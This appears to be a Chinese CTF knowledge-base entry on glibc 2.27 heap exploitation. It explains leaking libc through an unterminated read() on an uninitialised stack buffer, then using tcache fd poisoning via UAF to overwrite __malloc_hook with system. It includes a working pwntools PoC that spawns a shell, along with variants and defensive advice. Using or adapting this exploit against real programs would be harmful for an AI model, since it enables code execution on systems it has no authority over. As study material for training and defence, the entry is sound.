---
id: binary-pwn-heap-uninit-stack-buffer-leak-tcache-dup-malloc-hook
title: 无 show 功能时的替代泄露：未初始化栈缓冲区 + read 不补 NUL 打出 libc 指针，再用 UAF 写 tcache fd 打 __malloc_hook
type: scenario
domain: binary
path: binary/pwn/heap
technique: uninit-stack-buffer-leak-tcache-dup-malloc-hook
tags:
- pwn
- heap
- glibc
- glibc227
- tcache
- tcache-dup
- uaf
- info-leak
- malloc-hook
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W2
  verified_at: '2026-11-08T18:31:30+08:00'
  notes: 已对照原文核对；本次核对未读取图片；原文一致处：未初始化栈buf+read(0x63)不补NUL导致%s打印读穿、libc偏移0x64f44、reroll释放mem2后非法选项不填充、Welcome %s泄露tcache fd得heap、UAF改fd为__malloc_hook、两次99字节申请写system、以/bin/sh地址作size触发；触发条件中UAF写对象表述略含混（实际为reroll释放的mem2被strcpy写入），不影响利用步骤正确性
url: /docs/binary/pwn/heap/binary-pwn-heap-uninit-stack-buffer-leak-tcache-dup-malloc-hook/
draft: false
kb_aliases:
- 未初始化栈缓冲区泄露
- read 不补 \x00 泄露栈残留
- 无 show 堆题泄露 libc
- tcache dup 打 malloc_hook
- 只改两次名的堆题
- glibc 2.27 tcache UAF
---

## 一句话结论

堆题里没有 `show`、且释放的 chunk 都只进 tcache（不会进 unsorted bin）时，泄露点常常藏在别处：一个**未初始化**的栈缓冲区先被 `read` 写入少量字节、再被当作 `%s` 打印，因为 `read` 不会补 `\x00`，`printf`/`fprintf` 会一路读穿到缓冲区里残留的栈上指针，直接把 libc 地址打回来；拿到 libc 后利用同一处「可写已释放 chunk」的 UAF 改写 tcache `fd` 指向 `__malloc_hook`，两次分配后写入 `system` 即拿 shell。

## 原理

- **泄露为什么成立**：局部数组 `char buf[N]` 在栈上没有初始化，里面残留着上一次函数调用留下的指针（返回地址、`fprintf` 的 libc 返回地址、`_start` 的 PIE 地址、canary 附近的数据）。`read(0, buf, 0x63)` 只把输入字节写进去，**不会**在末尾追加 `\x00`；随后 `fprintf(stdout, "... %s\n", buf)` 会一直读到最近的 `\x00` 为止，于是把输入之后那些残留字节一起当作字符串输出。
- **为什么必须用「不补 NUL」的读**：`scanf`/`gets`/`fgets` 会补终止符，只有 `read`/`recv` 这类原始读不会；所以判据是「同一缓冲区先 read 再按 %s 打印」。
- **为什么只能泄露一次**：原文在这次打印之后无论成功与否都会 `memset(buf, 0, 0x100)` 清零，所以机会只有一次；因此要选最有用的那个指针——libc 地址（后续 `system` 与 `__malloc_hook` 都需要），而栈地址/PIE 地址在这个程序里没有二次用途。
- **第二条泄露通道**：菜单结束时打印「Welcome %s」用的是堆上 `mem2` 的内容。若 `mem2` 已被 `free` 且未重新填充，其用户区前 8 字节就是 tcache 链的 `next` 指针——即**堆地址**。这条通道与上面那条互补：一条给 libc，一条给 heap。
- **tcache dup 为什么能打 `__malloc_hook`**：glibc 2.27 的 tcache 是单链表，`fd` 存放下一空闲 chunk 地址且**无任何完整性校验**（无 safe-linking、无 `key` 字段）。程序提供「释放后再写入该 chunk」的 UAF 写，就能把 `fd` 改成任意地址；之后两次 `malloc(同 size)`：第一次返回原 chunk，第二次返回攻击者写入的地址。把该地址选为 `__malloc_hook`，再申请一次即可用申请到的内容覆盖 hook。
- **为什么能连着打**：因为 `size` 由用户自报（`read_num` + `strtoul`），可以自由选择落入哪个 tcache bin，也可以申请足够大的块给 hook 写 `system` 地址。

## 触发条件

- 程序存在「释放后仍可写入」或「释放后仍可被写入」的 UAF 写（本例是菜单第一步先 `free(mem1)`，之后输入的 name 被 `strcpy` 到另一个同样大小的已释放/待释放 chunk）。
- 栈上存在未初始化缓冲区，先被 `read` 写入再被 `%s` 打印。
- glibc 2.27（tcache 无校验、`__malloc_hook` 仍存在且在调用 `malloc` 时被使用）。
- 能自由控制申请大小（`malloc(用户输入)`）。
- 操作次数受限（本例总操作数只有 4 次、改名 2 次），因此每一步必须复用、不能浪费。

## 利用步骤

1. 触发泄露：选「改自定义名」→ 该分支先 `free(mem1)`，然后 `read` 读取名字，紧接着打印 `Are you sure ... %s`。输入 56 字节填充（`cyclic(56)`）让打印越过输入区，接住后面的 libc 指针；随后回答 `n` 放弃本次改名，这样不消耗改名次数，可再次进入。
2. 计算基址：`libc.address = leak - <fprintf 返回地址偏移>`（原文偏移 `0x64f44`，随 libc 版本变化，需按目标 libc 核对）。
3. 取得 heap 地址（可选，供其它路线）：选「reroll」释放 `mem2`，第二个子菜单输入一个非法选项，使程序**不**往 `mem2` 填内容；再选「continue」跳出循环，函数结尾打印 `Welcome %s` 即 `mem2` 用户区里残留的 tcache `next` 指针。
4. 改写 tcache `fd`：再次选「改自定义名」，此时被释放的 `mem1`/`mem2` 在 0x70 bin 里，输入 `p64(__malloc_hook) + b"\n"`（6 字节即可，末尾换行会被截掉），回答 `y` 完成写入——`fd` 变成 `__malloc_hook`。
5. 消耗链：申请一次 99 字节（返回原 chunk，把 `__malloc_hook` 顶到 tcache 头），再申请一次 99 字节（返回 `__malloc_hook`），内容写 `p64(system)`。
6. 触发：申请时把大小字段填成 `"/bin/sh"` 字符串的地址（`strtoul` 解析数字，传入 `malloc` 前是同一个寄存器），`malloc` 调用 `__malloc_hook`（已被改成 `system`），参数正是该地址，得到 shell。

## PoC

```python
from pwncli import *
cli_script()
io, elf, libc = gift.io, gift.elf, gift.libc

sla(b"> ", b"1")                      # 进入「改自定义名」：先 free(mem1)
sa(b": ", cyclic(56))                 # 不补 NUL，打印时读穿到栈上残留指针
ru(cyclic(56))
leak = unpack(rl()[:-1], "all")
libc.address = leak - 0x64f44         # 偏移按目标 libc 核对
sla(b": ", b"n")                      # 放弃改名，保留次数

sla(b"> ", b"2"); sla(b"> ", b"2")    # reroll：free(mem2)，用非法选项让其不被填充

sla(b"> ", b"1")                      # UAF 写：把 tcache fd 改成 __malloc_hook
sa(b": ", pack(libc.sym.__malloc_hook)[:6] + b"\x0a")
sla(b": ", b"y")

sla(b"> ", b"1"); sla(b": ", b"99"); sla(b": ", b"123")          # 消耗原 chunk
sla(b"> ", b"1"); sla(b": ", b"99"); sla(b": ", pack(libc.sym.system))  # 落到 hook 上写 system
sla(b"> ", b"1"); sla(b": ", str(next(libc.search(b"/bin/sh"))).encode())  # 以 sh 地址为参数触发
ia()
```

## 变体与关联

- **变体一**：默认的 `%s` 打印点被修掉时，改找「结构体未初始化字段被回显」（如长度字段/名字指针）作为泄露面；本质同源：程序把未初始化的内存当数据输出。
- **变体二**：glibc 2.31+ 有 `key` 字段与 safe-linking，直接改 `fd` 会被检测；此时需要先泄露/推导 `chunk>>12` 或改用 tcache poisoning 的 safe-linking 编码写法。
- **变体三**：`__malloc_hook` 移除（2.34+）后同一 UAF 写转向 `_IO_list_all`/`__free_hook`（若存在）/`_rtld_global` 等目标。
- **关联**：[[binary-pwn-heap-glibc223-uaf-fastbin-dup-malloc-hook-realloc-onegadget]]（同为 glibc 2.23/2.27 打 `__malloc_hook`，但泄露来自 unsorted bin + show，本条无 show、靠未初始化栈缓冲区）、[[ctf-pwn-menu-uaf-heap-overflow-tcache-poison-freehook-system]]（菜单式 UAF + tcache 投毒，打的是 `__free_hook`）、[[binary-pwn-heap-no-uaf-heap-leak-tcache-fastbin-stale-fd]]（另一类「没有常规泄露点」时的替代泄露思路）。

## 检测与防御

- 代码侧：所有用于字符串输出的缓冲区先 `memset`/清零，或用「读取长度 + 显式补 `\x00`」的方式（`read` 后 `buf[n]=0`）；编译期开启 `-ftrivial-auto-var-init=zero` 可消除这类栈残留泄露。
- 堆侧：升级 glibc（tcache `key` + safe-linking、移除 malloc/free hook）；CTF/评测侧对「无 show 但打印未初始化缓冲区」单独设检查。
- 检测：进程输出中出现疑似 libc/栈地址的原始字节（非 ASCII、以 `\x7f` 结尾的 6 字节）；同一进程在极短时间内先异常输出再崩溃于 `malloc`。
